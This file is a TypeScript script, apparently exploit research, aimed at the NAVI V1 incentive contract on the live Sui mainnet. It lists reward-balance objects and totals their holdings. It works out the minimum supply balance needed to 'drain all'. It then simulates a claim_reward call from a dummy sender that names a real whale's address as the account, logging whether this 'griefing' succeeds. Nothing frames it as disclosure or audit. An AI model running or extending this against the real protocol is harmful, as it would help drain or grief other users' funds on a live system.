import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });
const V1_PKG   = "0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca";
const INCENTIVE = "0xaaf735bf83ff564e1b219a0d644de894ef5bdc4b2250b126b2a46dd002331821";
const STORAGE  = "0xbb4e2f4b6205c2e2a2db47aeb4f830796ec7c005f88537ee775986639bc442fe";
const CLOCK    = "0x0000000000000000000000000000000000000000000000000000000000000006";
const SUI_TYPE = "0x2::sui::SUI";
const RAY = 1_000_000_000_000_000_000_000_000_000n;
const NAVI_WHALE = "0x7861f12c652dbcf96589413cf5cbc5ebcccd85c2c9f09c25fee76f2a218195c9";
const DUMMY = "0x0000000000000000000000000000000000000000000000000000000000001337";
const FROZEN: Record<number, bigint> = {
  0: 916_500_000_000_000_000_000_000n,
  1: 1_621_000_000_000_000_000_000_000n,
  2: 1_324_000_000_000_000_000_000_000n,
};

// Paginate through all IncentiveBal objects using getOwnedObjects isn't right — use SuiScan RPC
// Use suix_queryObjects via raw RPC
async function rpcCall(method: string, params: any[]): Promise<any> {
  const res = await fetch("https://fullnode.mainnet.sui.io:443", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
  });
  return res.json();
}

async function findIncentiveBals() {
  console.log("=== Finding IncentiveBal objects by asset ===\n");
  const ibType = `${V1_PKG}::incentive::IncentiveBal<${SUI_TYPE}>`;
  
  // Use suix_queryObjects (available on Sui mainnet)
  let cursor: string | null = null;
  const allObjs: any[] = [];
  
  do {
    const params: any[] = [{ filter: { StructType: ibType } }, { limit: 50, cursor }, null, true];
    const d = await rpcCall("suix_queryObjects", params);
    const items = d.result?.data ?? [];
    allObjs.push(...items);
    cursor = d.result?.nextCursor ?? null;
    if (!d.result?.hasNextPage) break;
  } while (cursor);
  
  if (allObjs.length === 0) {
    // Fallback: query with showContent
    const d2 = await rpcCall("suix_queryObjects", [
      { filter: { StructType: ibType } },
      { limit: 50, showContent: true },
    ]);
    allObjs.push(...(d2.result?.data ?? []));
    console.log("Error details:", JSON.stringify(d2.error ?? "").slice(0, 100));
  }
  
  console.log(`Total IncentiveBal<SUI> objects found: ${allObjs.length}`);
  
  // Fetch content for each
  const ids = allObjs.map((o: any) => o.data?.objectId ?? o.objectId).filter(Boolean);
  const byAsset: Record<number, Array<{id: string, idx: number, balance: bigint}>> = {};
  let grandTotal = 0n;
  
  // Batch fetch
  for (let i = 0; i < ids.length; i += 20) {
    const batch = ids.slice(i, i + 20);
    const objs = await client.multiGetObjects({ ids: batch, options: { showContent: true } });
    for (const obj of objs) {
      const f = (obj.data?.content as any)?.fields ?? {};
      const asset = parseInt(f.asset ?? 0);
      const idx = parseInt(f.current_idx ?? 0);
      const balance = BigInt(f.balance ?? 0);
      if (balance > 0n) {
        if (!byAsset[asset]) byAsset[asset] = [];
        byAsset[asset].push({ id: obj.data?.objectId ?? "", idx, balance });
        grandTotal += balance;
      }
    }
  }
  
  for (const [asset, items] of Object.entries(byAsset).sort((a,b) => parseInt(a[0])-parseInt(b[0]))) {
    const assetN = parseInt(asset);
    const total = items.reduce((s, x) => s + x.balance, 0n);
    items.sort((a, b) => Number(b.balance - a.balance));
    console.log(`Asset ${asset}: ${items.length} non-zero objects, total=${(Number(total)/1e9).toFixed(2)} SUI`);
    for (const item of items.slice(0, 3)) {
      console.log(`  idx=${item.idx}  ${(Number(item.balance)/1e9).toFixed(2)} SUI  ${item.id.slice(0,18)}...`);
    }
    if (items.length > 3) console.log(`  ...+${items.length - 3} more`);
    
    const frozen = FROZEN[assetN] ?? 0n;
    const minSupply = frozen > 0n ? (total * RAY / frozen) : 0n;
    console.log(`  Min supply_balance to drain all: ${(Number(minSupply)/1e9).toFixed(0)} asset-${asset} units`);
    
    // Test griefing with whale
    if (items.length > 0) {
      const tx = new Transaction();
      tx.setSender(DUMMY);
      tx.moveCall({
        target: `${V1_PKG}::incentive::claim_reward`,
        typeArguments: [SUI_TYPE],
        arguments: [
          tx.object(INCENTIVE),
          tx.object(items[0].id),
          tx.object(CLOCK),
          tx.object(STORAGE),
          tx.pure.address(NAVI_WHALE),
        ],
      });
      const r = await client.devInspectTransactionBlock({ transactionBlock: tx, sender: DUMMY });
      const ok = r.effects?.status?.status === "success";
      console.log(`  Griefing (NAVI whale as account): ${ok ? "✅ success" : "❌ " + r.effects?.status?.error?.slice(0,60)}`);
    }
    console.log();
  }
  
  console.log(`GRAND TOTAL (all assets): ${(Number(grandTotal)/1e9).toFixed(2)} SUI`);
}

findIncentiveBals().catch(console.error);
